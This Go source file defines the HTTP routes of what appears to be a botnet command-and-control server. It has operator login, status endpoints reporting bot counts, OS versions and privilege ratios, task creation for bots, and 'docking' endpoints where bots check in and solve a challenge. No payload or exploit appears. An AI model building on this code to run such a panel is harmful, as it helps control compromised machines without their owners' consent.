package server

import (
	cAuth "controllers/auth"
	cBot "controllers/bot"
	cSetting "controllers/setting"
	cStatus "controllers/status"
	cTask "controllers/task"
	"github.com/gin-gonic/gin"
	mAuth "middlewares/auth"
	mBot "middlewares/bot"
)

func getRouter() *gin.Engine {
	router := gin.New()
	router.Use(gin.Recovery())
	router.Use(gin.Logger())
	router.Use(mAuth.CORSMiddleware)

	api := router.Group("/api")
	{
		user := api.Group("/user")
		{
			user.POST("/check", cAuth.Check) // check token
			user.POST("/login", cAuth.Login) // get token
		}

		status := api.Group("/status")
		{
			status.Use(mAuth.CheckUserToken)

			status.GET("/bot", cStatus.GetBotStatus)       // get os version, online/offline bot count, privilege ratio
			status.GET("/server", cStatus.GetServerStatus) // get resource usage, summary
			status.GET("/bot/list", cStatus.GetBotList)    // get bot list
		}

		task := api.Group("/task")
		{
			task.Use(mAuth.CheckUserToken)

			task.POST("/create", cTask.CreateTask) // create new task
			task.GET("/history", cTask.GetHistory) // get old tasks
		}

		setting := api.Group("/setting")
		{
			setting.Use(mAuth.CheckUserToken)

			setting.POST("/update", cSetting.UpdateSetting) // update setting
		}

		docking := api.Group("/docking")
		{
			docking.Use(mBot.CheckBot)

			docking.POST("/knock", cBot.ParseKnock)     // default knock
			docking.POST("/solve", cBot.SolveChallenge) // get cookie
		}
	}

	return router
}
